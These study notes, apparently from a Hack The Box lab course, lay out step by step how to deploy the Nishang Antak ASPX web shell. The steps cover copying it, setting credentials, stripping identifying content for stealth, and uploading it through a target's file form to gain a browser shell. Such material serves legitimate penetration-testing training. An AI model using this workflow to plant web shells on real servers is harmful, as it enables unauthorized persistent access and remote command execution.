## 4. Workflow to Use Antak Webshell

### Step 1: Copy the Shell for Editing

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

---

### Step 2: Modify Credentials

Edit `Upload.aspx`:

```csharp
if(Request["username"] == "htb-student" && Request["password"] == "htb-student")
```

**Optional for Stealth:**

- Remove ASCII art.
    
- Strip verbose comments or unused code.
    

---

### Step 3: Update `/etc/hosts`

To resolve the internal domain:

```bash
sudo nano /etc/hosts
```

Add:

```
<target-ip> status.inlanefreight.local
```

---

### Step 4: Upload the ASPX File

Use the **upload form** on the target web app:

- Files are stored in the `\\files\\` directory.
    
- Example URL:
    

```
http://status.inlanefreight.local/files/Upload.aspx
```

---

### Step 5: Access the Web Shell

- Open the URL in your browser.
    
- Log in with your set credentials (example: `htb-student / htb-student`).
    
- You should see the **Antak interface**.
